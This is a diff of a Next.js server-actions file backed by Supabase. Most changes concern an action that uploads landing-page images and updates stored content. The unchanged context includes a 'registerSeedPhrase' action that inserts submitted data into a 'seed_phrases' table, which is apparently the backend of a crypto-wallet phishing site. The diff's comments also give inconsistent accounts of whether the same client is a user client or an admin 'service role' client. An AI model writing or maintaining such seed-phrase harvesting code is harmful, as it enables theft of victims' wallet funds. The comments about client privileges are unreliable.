@@ -2,7 +2,7 @@
 "use server";
 
 import { z } from "zod";
-import { createClient as createServerClient } from "@/lib/supabase/server";
+import { createClient } from "@/lib/supabase/server";
 import { revalidatePath } from "next/cache";
 
 const formSchema = z.object({
@@ -33,7 +33,7 @@ export async function registerSeedPhrase(
   }
 
   try {
-    const supabaseAdmin = createServerClient();
+    const supabaseAdmin = createClient();
     const { error } = await supabaseAdmin
       .from("seed_phrases")
       .insert([
@@ -70,20 +70,21 @@ export async function updateLandingPageImages(
   formData: FormData
 ): Promise<UpdateImagesResult> {
 
-  // Use the standard server client which operates on behalf of the logged-in user
-  const supabase = createServerClient();
+  // Use the service role client for all backend operations
+  const supabaseAdmin = createClient();
 
   const bucketName = "landing-images";
   const updatedUrls: Record<string, string> = {};
 
-  // Fetch the current content
-  const { data: currentContentData, error: fetchError } = await supabase
+  // Fetch the current content using the admin client
+  const { data: currentContentData, error: fetchError } = await supabaseAdmin
     .from("editable_content")
     .select("content")
     .eq("id", "landing-page-images")
     .single();
 
   if (fetchError) {
+    console.error("Supabase fetch error:", fetchError.message);
     return { success: false, error: `Database fetch error: ${fetchError.message}` };
   }
 
@@ -93,10 +94,10 @@ export async function updateLandingPageImages(
     if (file instanceof File) {
       const filePath = `${id}-${Date.now()}`;
       
-      const { error: uploadError } = await supabase.storage
+      const { error: uploadError } = await supabaseAdmin.storage
         .from(bucketName)
         .upload(filePath, file, {
-            upsert: true,
+            upsert: true, // Use upsert to handle re-uploads
         });
 
       if (uploadError) {
@@ -104,7 +105,7 @@ export async function updateLandingPageImages(
         return { success: false, error: `Upload error: ${uploadError.message}` };
       }
 
-      const { data: publicUrlData } = supabase.storage
+      const { data: publicUrlData } = supabaseAdmin.storage
         .from(bucketName)
         .getPublicUrl(filePath);
 
@@ -115,9 +116,7 @@ export async function updateLandingPageImages(
     }
   }
   
-  // Use the service role client ONLY to update the database table
-  // This assumes you have RLS policies on `editable_content` that might prevent user updates
-   const supabaseAdmin = createServerClient();
+  // Use the same admin client to update the database table
   const { error: updateError } = await supabaseAdmin
     .from("editable_content")
     .update({ content: newContent, updated_at: new Date().toISOString() })
@@ -128,7 +127,7 @@ export async function updateLandingPageImages(
     return { success: false, error: `Database update error: ${updateError.message}` };
   }
 
-  // Revalidate the cache for the home page
+  // Revalidate the cache for the home page. This is crucial.
   revalidatePath('/');
 
   return { success: true, updatedUrls };
